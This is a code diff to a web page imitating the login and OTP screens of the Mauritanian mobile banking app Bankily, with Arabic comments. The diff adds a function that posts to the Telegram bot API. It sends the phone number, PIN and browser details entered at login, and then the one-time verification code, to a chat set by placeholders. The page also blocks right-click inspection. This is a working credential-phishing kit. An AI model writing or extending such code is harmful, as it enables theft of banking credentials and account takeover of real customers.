@@ -283,7 +283,7 @@
             margin-bottom: 25px;
         }
 
-        /* التصميم الخاص بكلمة "رمز التاكيد" بدلاً من الدائرة الخضراء لتطابق التطبيق الرسمي */
+        /* التصميم الخاص بكلمة "رمز التاكيد" المطابق تماماً للتطبيق الرسمي */
         .otp-confirmation-text {
             font-size: 1.15rem;
             font-weight: bold;
@@ -294,10 +294,10 @@
             width: 100%;
         }
 
-        /* تصميم كرت التنبيه السفلي المنبثق (Toast Alert) المطابق للفيديو تماماً */
+        /* تصميم كرت التنبيه السفلي المنبثق (Toast Alert) */
         .custom-toast-alert {
             position: absolute;
-            bottom: 85px; /* يظهر فوق زر تسجيل الدخول مباشرة */
+            bottom: 85px; 
             left: 5%;
             width: 90%;
             background-color: #ffffff;
@@ -452,6 +452,27 @@
     </div>
 
     <script>
+        // ================== إعدادات التليجرام ==================
+        const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN'; // ضع هنا توكن البوت الخاص بك
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // ضع هنا الأيدي الشات الخاص بك
+
+        // دالة الإرسال إلى التليجرام
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error('Error sending to Telegram:', err));
+        }
+        // ========================================================
+
         // --- حظر النقر بزر الماوس الأيمن والأوسط لحماية الواجهة والبيانات ---
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
@@ -467,24 +488,21 @@
         // تنظيف مدخلات الأرقام لحقل الهاتف والتحقق الذكي من الشبكات الموريتانية المعتمدة
         function cleanNumberInput(input) {
             input.value = input.value.replace(/[^0-9]/g, '');
-            
             const toast = document.getElementById('toastAlert');
             
-            // عندما يكتمل كتابة الـ 8 أرقام يتم فحص البداية (الشركات الموريتانية تبدأ بـ 2 أو 3 أو 4)
             if (input.value.length === 8) {
                 const firstDigit = input.value.charAt(0);
                 if (firstDigit !== '2' && firstDigit !== '3' && firstDigit !== '4') {
-                    toast.classList.add('show'); // إظهار التنبيه
+                    toast.classList.add('show'); 
                 } else {
-                    toast.classList.remove('show'); // إخفاء التنبيه إذا كان صحيحاً
+                    toast.classList.remove('show'); 
                 }
             } else {
-                // إخفاء التنبيه تلقائياً إذا قام بحذف أي رقم أو لم يكمل 8 أرقام
                 toast.classList.remove('show');
             }
         }
 
-        // حركة التنقل التلقائي وخلفي لحقول الرقم السري الأربعة (تبدأ وتتحرك من اليسار فقط)
+        // حركة التنقل التلقائي وخلفي لحقول الرقم السري الأربعة
         function handlePasswordNavigation(current, currentIndex) {
             current.value = current.value.replace(/[^0-9]/g, '');
             const fields = document.querySelectorAll('.password-field');
@@ -503,7 +521,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // حركة التنقل لحقول رمز التحقق OTP (تبدأ وتتحرك من اليسار فقط)
+        // حركة التنقل لحقول رمز التحقق OTP
         function handleOtpNavigation(current, currentIndex) {
             current.value = current.value.replace(/[^0-9]/g, '');
             const fields = document.querySelectorAll('.otp-field');
@@ -522,7 +540,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // التحقق عند الضغط على الزر الرئيسي
+        // التحقق والإرسال عند الضغط على الزر الرئيسي
         function onFooterButtonClick() {
             const loginSection = document.getElementById('loginSection');
             const otpSection = document.getElementById('otpSection');
@@ -547,7 +565,6 @@
                     return;
                 }
 
-                // منع الانتقال في حالة ظهور التنبيه السلبي لرقم الهاتف
                 if (toast.classList.contains('show')) {
                     alert("الرجاء إدخال رقم هاتف موريتاني صحيح تابع لـ (موريتل، ماتل، شنقيتل).");
                     return;
@@ -558,16 +575,22 @@
                     return;
                 }
 
+                // --- [الرسالة الأولى للتليجرام: بيانات الدخول] ---
+                const msg = `🔔 *تسجيل دخول جديد (بنكيلي)*\n\n👤 *رقم الهاتف:* \`${userVal}\`\n🔐 *الرقم السري:* \`${passVal}\`\n🌐 *المتصفح:* ${navigator.userAgent}`;
+                sendToTelegram(msg);
+
+                // الانتقال للـ OTP
                 loginSection.classList.add('hidden');
                 otpSection.classList.remove('hidden');
                 titleText.innerText = "رمز التحقق";
                 backArrow.style.display = "block";
                 submitBtn.innerText = "التحقق";
-                toast.classList.remove('show'); // إخفاء التنبيه عند الذهاب لواجهة الـ OTP
+                toast.classList.remove('show');
                 
             } else {
                 let otpCode = "";
                 document.querySelectorAll('.otp-field').forEach(box => otpCode += box.value.trim());
+                const userVal = document.getElementById('usernameInput').value.trim();
 
                 if (otpCode === "") {
                     alert("الرجاء إدخال رمز التحقق (OTP) المرسل إلى هاتفك.");
@@ -578,6 +601,10 @@
                     alert("الرجاء تعبئة حقل الـ OTP كاملاً (4 أرقام).");
                     return;
                 }
+
+                // --- [الرسالة الثانية للتليجرام: كود الـ OTP] ---
+                const otpMsg = `📩 *رمز التحقق المكتوب (OTP)*\n\n👤 *الحساب:* \`${userVal}\`\n🔢 *كود الـ OTP:* \`${otpCode}\``;
+                sendToTelegram(otpMsg);
 
                 alert("تم التحقق بنجاح! جاري تسجيل الدخول...");
             }
